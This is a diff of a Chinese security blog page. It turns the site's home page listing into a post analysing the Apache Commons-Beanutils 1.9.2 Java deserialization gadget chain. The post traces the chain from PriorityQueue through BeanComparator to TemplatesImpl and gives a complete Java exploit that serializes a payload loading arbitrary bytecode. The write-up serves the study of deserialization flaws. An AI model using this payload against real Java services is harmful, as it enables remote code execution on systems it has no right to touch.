@@ -1,11 +1,10 @@
 <!DOCTYPE html><html lang="en">
   <head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>Home - DumKiy's blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no"><title>Commons-beanutils - DumKiy's blog</title>
 
-<meta name="description" content="Watch And Learn
-">
-<link rel="canonical" href="http://localhost:4000/"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
+<meta name="description" content="流程图分析与复现0x00 前置知识1. Java Bean具体可见：JavaBean2. commons-beanutilscommons-beanutils 是 Apache 提供的一个用于操作 JAVA bean （普通 JAVA 类对象）的工具包。里面提供了各种各样的工具类，让我们可以很方便的对 bean ...">
+<link rel="canonical" href="http://localhost:4000/java/2021/12/24/Commons-beanutils.html"><link rel="alternate" type="application/rss+xml" title="DumKiy's blog" href="/feed.xml"><!-- start favicons snippet, use https://realfavicongenerator.net/ --><link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png"><link rel="manifest" href="/assets/site.webmanifest"><link rel="mask-icon" href="/assets/safari-pinned-tab.svg" color="#fc4d50"><link rel="shortcut icon" href="/assets/favicon.ico">
 
 <meta name="msapplication-TileColor" content="#ffc40d"><meta name="msapplication-config" content="/assets/browserconfig.xml">
 
@@ -255,7 +254,7 @@
 </head>
   <body>
     <div class="root" data-is-touch="false">
-      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport cell cell--auto">
+      <div class="layout--page js-page-root"><div class="page__main js-page-main page__viewport has-aside cell cell--auto">
 
       <div class="page__main-inner"><div class="page__header d-print-none"><header class="header"><div class="main">
       <div class="header__title">
@@ -289,75 +288,224 @@ l2 -1365 29 -70 c58 -141 151 -240 280 -299 110 -51 50 -49 1941 -48 1722 0
 </svg>
 <a title="Watch And Learn
 " href="/">DumKiy's blog</a></div><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></div><nav class="navigation">
-        <ul><li class="navigation__item navigation__item--active"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
+        <ul><li class="navigation__item"><a href="/">Home</a></li><li class="navigation__item"><a href="/categories.html">Categories</a></li><li class="navigation__item"><a href="/tags.html">tags</a></li><li class="navigation__item"><a href="/about.html">About</a></li><li class="navigation__item"><a href="https://github.com/DummyKitty">GitHub</a></li><li><button class="button button--secondary button--circle search-button js-search-toggle"><i class="fas fa-search"></i></button></li></ul>
       </nav></div>
   </header>
 </div><div class="page__content"><div class ="main"><div class="grid grid--reverse">
 
-              <div class="col-aside d-print-none js-col-aside"></div>
+              <div class="col-aside d-print-none js-col-aside"><aside class="page__aside js-page-aside"><div class="toc-aside js-toc-root"></div>
+</aside></div>
 
               <div class="col-main cell cell--auto"><!-- start custom main top snippet -->
 
 <!-- end custom main top snippet -->
-<article itemscope itemtype="http://schema.org/WebPage"><header style="display:none;"><h1>Home</h1></header><meta itemprop="headline" content="Home"><meta itemprop="author" content="DumKiy"/><div class="js-article-content"><div class="layout--articles"><div class="article-list items"><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="GOAD,Active+Directory" data-categories="Pentest">
-        <div class="item__content"><span class="item__meta">Nov 28</span><a itemprop="headline" class="item__header" href="/pentest/2023/11/28/GOAD-%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html">GOAD 靶场环境搭建</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="nodejs,vega" data-categories="CTF">
-        <div class="item__content"><span class="item__meta">Nov 27</span><a itemprop="headline" class="item__header" href="/ctf/2023/11/27/TPCTF2023-%E9%83%A8%E5%88%86-web-Writeup.html">TPCTF 2023 graphoid writeup</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="windows,LPE,Info+gathering" data-categories="Pentest">
-        <div class="item__content"><span class="item__meta">Nov 20</span><a itemprop="headline" class="item__header" href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9.html">Windows 提权知识点</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="windows,LPE,Info+gathering" data-categories="Pentest">
-        <div class="item__content"><span class="item__meta">Nov 20</span><a itemprop="headline" class="item__header" href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-3-%E5%88%A9%E7%94%A8%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83.html">Windows 提权（三）利用服务权限错误提权</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="windows,LPE,Info+gathering" data-categories="Pentest">
-        <div class="item__content"><span class="item__meta">Nov 20</span><a itemprop="headline" class="item__header" href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-2-%E8%BF%9B%E7%A8%8B%E7%9B%B8%E5%85%B3%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F.html">Windows 提权（二）进程相关提权方式</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="windows,LPE,Info+gathering" data-categories="Pentest">
-        <div class="item__content"><span class="item__meta">Nov 20</span><a itemprop="headline" class="item__header" href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83-1-%E5%88%A9%E7%94%A8%E5%AF%BC%E5%87%BA%E6%88%96%E6%9F%A5%E6%89%BE%E5%AF%86%E7%A0%81%E6%8F%90%E6%9D%83.html">Windows 提权（一）利用导出或查找密码提权</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="CMS" data-categories="code+audit">
-        <div class="item__content"><span class="item__meta">Aug 09</span><a itemprop="headline" class="item__header" href="/code%20audit/2023/08/09/DirCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.html">DirCMS 审计</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="pyjail" data-categories="Python">
-        <div class="item__content"><span class="item__meta">Aug 03</span><a itemprop="headline" class="item__header" href="/python/2023/08/03/pyjail-bypass-09-%E7%BB%95%E8%BF%87%E8%BE%93%E5%87%BA%E9%99%90%E5%88%B6.html">pyjail bypass-09 绕过输出限制</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Jekyll" data-categories="ENV">
-        <div class="item__content"><span class="item__meta">Jul 30</span><a itemprop="headline" class="item__header" href="/env/2023/07/30/jeklly-theme-chirpy-%E5%A2%9E%E5%8A%A0%E7%9B%AE%E5%BD%95%E6%98%BE%E7%A4%BA%E7%BA%A7%E5%88%AB.html">Jekyll-theme-chirpy 主题增加目录展示级别</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="xss" data-categories="Python">
-        <div class="item__content"><span class="item__meta">Jul 30</span><a itemprop="headline" class="item__header" href="/python/2023/07/30/python-Flask-%E4%B8%AD%E7%9A%84-XSS.html">Flask 中的 XSS</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="inf" data-categories="Python">
-        <div class="item__content"><span class="item__meta">Jul 27</span><a itemprop="headline" class="item__header" href="/python/2023/07/27/python-inf-tricks.html">Python inf 特性</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Deserialization" data-categories="Java">
-        <div class="item__content"><span class="item__meta">Jul 24</span><a itemprop="headline" class="item__header" href="/java/2023/07/24/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-resolveClass.html">Java 反序列化绕过 resolvClass</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="Exchange" data-categories="Exchange">
-        <div class="item__content"><span class="item__meta">Jul 14</span><a itemprop="headline" class="item__header" href="/exchange/2023/07/14/Exchange-PowerShell-Remoting.html">Exchange PowerShell Remoting</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="NTLM" data-categories="Exchange">
-        <div class="item__content"><span class="item__meta">Jul 14</span><a itemprop="headline" class="item__header" href="/exchange/2023/07/14/BurpSuite-NTLM-%E6%8A%93%E5%8C%85%E9%97%AE%E9%A2%98.html">BurpSuite NTLM 抓包问题</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="%E5%B7%A5%E5%85%B7" data-categories="code+audit">
-        <div class="item__content"><span class="item__meta">Jul 11</span><a itemprop="headline" class="item__header" href="/code%20audit/2023/07/11/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7-Semgrep.html">代码审计工具 Semgrep</a></div>
-      </li><li class="item" itemscope itemtype="http://schema.org/BlogPosting" data-tags="RMI" data-categories="Java">
-        <div class="item__content"><span class="item__meta">Jul 04</span><a itemprop="headline" class="item__header" href="/java/2023/07/04/Java-JNDI-%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0.html">Java JNDI 安全笔记</a></div>
-      </li></div>
-</div><div class="layout--home"><div class="pagination"><p>80 post articles, 5 pages.</p>
-    <div class="pagination__menu">
-      <ul class="menu menu--nowrap"><li><div class="button button--secondary button--circle disabled">
-            <i class="fas fa-angle-left"></i>
-          </div></li><li>
-              <div class="button button--primary button--circle focus"><span>1</span></div>
-            </li><li>
-                <a class="button button--secondary button--circle" href="/page2"><span>2</span></a>
-              </li><li>
-                <a class="button button--secondary button--circle" href="/page3"><span>3</span></a>
-              </li><li>
-                <a class="button button--secondary button--circle" href="/page4"><span>4</span></a>
-              </li><li>
-                <a class="button button--secondary button--circle" href="/page5"><span>5</span></a>
-              </li><li><a class="button button--secondary button--circle" href="/page2">
-            <i class="fas fa-angle-right"></i>
-          </a></li></ul>
-    </div>
-  </div></div>
-<script>/*(function () {
+<article itemscope itemtype="http://schema.org/Article"><div class="article__header"><header><h1>Commons-beanutils</h1></header><span class="split-space">&nbsp;</span>
+          <a class="edit-on-github"
+            title="Edit on Github"
+            href="https://github.com/user_name/repo_name/tree/master/_posts/2021-12-23-Commons-beanutils.md">
+            <i class="far fa-edit"></i></a></div><meta itemprop="headline" content="Commons-beanutils"><div class="article__info clearfix"><ul class="left-col menu"><li>
+              <a class="button button--secondary button--pill button--sm"
+                href="/archive.html?tag=Deserialization+exploit+chain">Deserialization exploit chain</a>
+            </li></ul><ul class="right-col menu"><li><i class="far fa-calendar-alt"></i> <span>Dec 24, 2021</span>
+            </li></ul></div><meta itemprop="author" content="DumKiy"/><meta itemprop="datePublished" content="2021-12-24T07:49:13+08:00">
+    <meta itemprop="keywords" content="Deserialization exploit chain"><div class="js-article-content"><div class="layout--article"><!-- start custom article top snippet -->
 
-})();*/
+<!-- end custom article top snippet -->
+<div class="article__content" itemprop="articleBody"><h1 id="流程图">流程图</h1>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640269301523-ee4fae93-1678-4d69-839b-59448150799a.jpeg" alt="img" /></p>
+
+<h1 id="分析与复现">分析与复现</h1>
+
+<h2 id="0x00-前置知识">0x00 前置知识</h2>
+
+<h3 id="1-java-bean">1. Java Bean</h3>
+
+<p>具体可见：<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean</a></p>
+
+<h3 id="2-commons-beanutils">2. commons-beanutils</h3>
+
+<p>commons-beanutils 是 Apache 提供的一个用于操作 JAVA bean （普通 JAVA 类对象）的工具包。里面提供了各种各样的工具类，让我们可以很方便的对 bean 对象的属性进行各种操作。</p>
+
+<p>commons-beanutils 中提供了一个静态方法 PropertyUtils.getProperty，让使用者可以直接调用任意JavaBean的getter方法，比如：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">PropertyUtils</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="k">new</span> <span class="nc">Cat</span><span class="o">(),</span> <span class="s">"name"</span><span class="o">);</span>
+</code></pre></div></div>
+
+<p>此时，commons-beanutils 会自动找到 name 属性的 getter 方法，也就是 getName，然后调用，获得返回值。</p>
+
+<p>除此之外，PropertyUtils.getProperty 还支持递归获取属性，比如a对象中有属性b，b对象中有属性c，我们可以通过PropertyUtils.getProperty(a, “b.c”);的方式进行递归获取。</p>
+
+<p>除了 PropertyUtils 之外，commons-beanutils 还提供了很多别的类：</p>
+
+<ol>
+  <li>MethodUtils ：通过反射对对象的方法做各种各样的操作。</li>
+  <li>
+    <p>ConstructorUtils ：通过反射对对象的构造方法做各种操作。</p>
+  </li>
+  <li>PropertyUtils ：通过反射对对象的属性做各种操作。</li>
+  <li>
+    <p>BeanUtils：通过反射提供了Bean对象的一些便捷操作方法。</p>
+  </li>
+  <li>ConvertUtils ：提供了数据类型相互转换的一些方法。</li>
+  <li>….</li>
+</ol>
+
+<p>具体的使用可见：<a href="https://www.jianshu.com/p/ae803ed938e5">commons-beanutils使用手册</a></p>
+
+<h2 id="0x01-概述">0x01 概述</h2>
+
+<h3 id="1-利用版本">1. 利用版本</h3>
+
+<p>commons-beanutils 1.9.2</p>
+
+<h3 id="2-限制">2. 限制</h3>
+
+<p>无</p>
+
+<h2 id="0x02-调用链分析">0x02 调用链分析</h2>
+
+<p>在前面的 CC 链中我们知道，调用 TemplatesImpl.newTransformer 方法可以进一步调用到后面的 ClassLoader.loadClass</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640267454135-438ef425-8b92-4145-9331-bf896c962cee.png" alt="img" /></p>
+
+<p>也就是说，哪里调用了 newTransformer，哪里就能够走完后面这一条链，在 CC3 中我们找到了 TrAXFilter 的构造函数。实际上我们在 IDEA 中进一步向上寻找时，还能够找到别的方法，就比如这个 getOutputProperties 方法。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640267755778-199f54fa-5db9-4b9d-8561-37f65bd39ece.png" alt="img" /></p>
+
+<p>CB 中的 BeanComparator 类提供了一个 compare 方法，该方法用于比较两个 JavaBean 是否相等，compare 方法中调用了 PropertyUtils.getProperty 方法。我们知道 PropertyUtils.getProperty 最终会调用某个对象的 getXXX 方法。</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640267516289-c4175bb6-914d-4bce-af26-1d5e9e22fb42.png" alt="img" /></p>
+
+<p>这样一来，使用 PropertyUtils.getProperty 来调用 TemplatesImpl.getOutputProperties 方法，就可以走完后面的 ClassLoader 了。</p>
+
+<p>另外，在 CC4 那一条链中，我们知道 PriorityQueue.readObject 会调用 compare 方法，正好对应这里的 BeanComparator.compare。因此整条链就走完了</p>
+
+<p>具体调用链如下：</p>
+
+<p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640269321250-560542fa-5bcf-4977-bc69-bd02d60669d8.png" alt="img" /></p>
+
+<h2 id="0x03-exp-编写">0x03 exp 编写：</h2>
+
+<p>需要注意的是，需要调用的方法为 getOutputProperties ，如果使用 PropertyUtils.getProperty 来调用，传入的字符串需要为 “outputProperties”(第一个字母为小写)。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.beanutils.BeanComparator</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Path</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CB</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">TestCB</span><span class="o">();</span>
+        <span class="n">unserialize</span><span class="o">(</span><span class="s">"abc.ser.bin"</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">TestCB</span><span class="o">()</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">Path</span> <span class="n">path</span> <span class="o">=</span> <span class="nc">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"C:\\tmp\\Calc2.class"</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="nc">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="n">path</span><span class="o">);</span>
+        <span class="kt">byte</span><span class="o">[][]</span> <span class="n">bytes1</span> <span class="o">=</span> <span class="o">{</span><span class="n">bytes</span><span class="o">};</span>
+        <span class="nc">TemplatesImpl</span> <span class="n">templates</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">TemplatesImpl</span><span class="o">();</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"_bytecodes"</span><span class="o">,</span><span class="n">bytes1</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"_name"</span><span class="o">,</span><span class="s">"aaa"</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"_class"</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">templates</span><span class="o">,</span><span class="s">"_tfactory"</span><span class="o">,</span><span class="k">new</span> <span class="nc">TransformerFactoryImpl</span><span class="o">());</span>
+
+        <span class="nc">BeanComparator</span> <span class="n">beanComparator</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BeanComparator</span><span class="o">(</span><span class="s">"outputProperties"</span><span class="o">);</span>
+
+        <span class="nc">PriorityQueue</span> <span class="n">priorityQueue</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PriorityQueue</span><span class="o">();</span>
+
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span><span class="s">"comparator"</span><span class="o">,</span><span class="kc">null</span><span class="o">);</span>
+
+        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"1"</span><span class="o">);</span>
+        <span class="n">priorityQueue</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"1"</span><span class="o">);</span>
+
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span><span class="s">"queue"</span><span class="o">,</span><span class="k">new</span> <span class="nc">Object</span><span class="o">[]{</span><span class="n">templates</span><span class="o">,</span><span class="n">templates</span><span class="o">});</span>
+
+        <span class="n">setFieldValue</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">,</span><span class="s">"comparator"</span><span class="o">,</span><span class="n">beanComparator</span><span class="o">);</span>
+        <span class="n">serialize</span><span class="o">(</span><span class="n">priorityQueue</span><span class="o">);</span>
+
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">setFieldValue</span><span class="o">(</span><span class="nc">Object</span> <span class="n">obj</span><span class="o">,</span> <span class="nc">String</span> <span class="n">fieldName</span><span class="o">,</span> <span class="nc">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
+        <span class="nc">Field</span> <span class="n">field</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">field</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="n">obj</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">serialize</span><span class="o">(</span><span class="nc">Object</span> <span class="n">o</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileOutputStream</span><span class="o">(</span><span class="s">"abc.ser.bin"</span><span class="o">));</span>
+        <span class="n">oos</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">o</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">unserialize</span><span class="o">(</span><span class="nc">String</span> <span class="n">filePath</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span><span class="o">{</span>
+        <span class="nc">ObjectInputStream</span> <span class="n">ins</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="nc">FileInputStream</span><span class="o">(</span><span class="n">filePath</span><span class="o">));</span>
+        <span class="n">ins</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<h2 id="0x04-总结">0x04 总结</h2>
+
+<p>commons-beanutils 这条链提供了另一种寻找调用链的方式——Java Bean，getProperty 可以进一步调用 get 开头的方法。commons-beanutils 这些便捷操作的实现，本质上也是使用了反射机制，一旦使用了反射，就不可避免出现容易被攻击者利用的情况，也算是一个为了高效牺牲了安全的例子。</p>
+
+<h1 id="参考资料">参考资料</h1>
+
+<ul>
+  <li><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean</a></li>
+  <li>
+    <p><a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html">CommonsBeanutils与无commons-collections的Shiro反序列化利用</a></p>
+  </li>
+  <li><a href="https://www.jianshu.com/p/ae803ed938e5">commons-beanutils使用手册</a></li>
+</ul>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2021-12-24T07:49:13+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/java/2021/12/23/CommonsCollections5.html">CommonsCollections5</a></div><div class="next"><span>NEXT</span><a href="/java/2022/03/27/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html">Java 反序列化</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
 </script>
-
-
-
 </div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
 
 <!-- end custom main bottom snippet -->
@@ -902,6 +1050,68 @@ window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
 /*(function () {
 
 })();*/
+</script><script>
+  /* toc must before affix, since affix need to konw toc' height. */(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window);
+    var $articleContent = $('.js-article-content');
+    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
+    var toc;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;
+
+    function disabled() {
+      return $col2.css('display') === 'none' || !hasToc;
+    }
+
+    tocDisabled = disabled();
+
+    toc = $tocRoot.toc({
+      selectors: TOC_SELECTOR,
+      container: $articleContent,
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      tocDisabled = disabled();
+      toc && toc.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+  });
+})();
+(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $window = $(window), $pageFooter = $('.js-page-footer');
+    var $pageAside = $('.js-page-aside');
+    var affix;
+    var tocDisabled = false;
+    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+
+    affix = $pageAside.affix({
+      offsetBottom: $pageFooter.outerHeight(),
+      scrollTarget: hasSidebar ? '.js-page-main' : null,
+      scroller: hasSidebar ? '.js-page-main' : null,
+      scroll: hasSidebar ? $('.js-page-main').children() : null,
+      disabled: tocDisabled
+    });
+
+    $window.on('resize', window.throttle(function() {
+      affix && affix.setOptions({
+        disabled: tocDisabled
+      });
+    }, 100));
+
+    window.pageAsideAffix = affix;
+  });
+})();
 </script><script>
   window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
     var $canvas = null, $this = null, _ctx = null, _text = '';
